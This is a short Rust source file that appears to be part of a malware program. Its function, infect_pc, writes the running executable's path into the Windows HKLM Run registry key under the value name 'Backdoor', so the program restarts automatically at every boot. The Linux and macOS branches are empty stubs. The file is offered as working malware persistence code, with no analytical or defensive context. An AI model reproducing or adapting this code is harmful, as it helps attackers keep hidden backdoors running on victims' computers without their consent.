extern crate winreg;

use std::path::{PathBuf, Path};
use std::env::{current_exe, consts::OS};
use winreg::enums::*;
use winreg::RegKey;

pub fn infect_pc(){
    let current_path: PathBuf = current_exe().unwrap();
    match OS{
        "windows" => {
            let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
            let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            let (key, disp) = hklm.create_subkey(&path).unwrap();
        
            match disp {
                REG_CREATED_NEW_KEY => println!("A new key has been created"),
                REG_OPENED_EXISTING_KEY => println!("An existing key has been opened"),
            }
        
            println!("{:?}", key.set_value("Backdoor", &current_path.into_os_string().into_string().unwrap()));
    },
        "linux" => (),
        "macos" => {},
        _ => {}
    }
}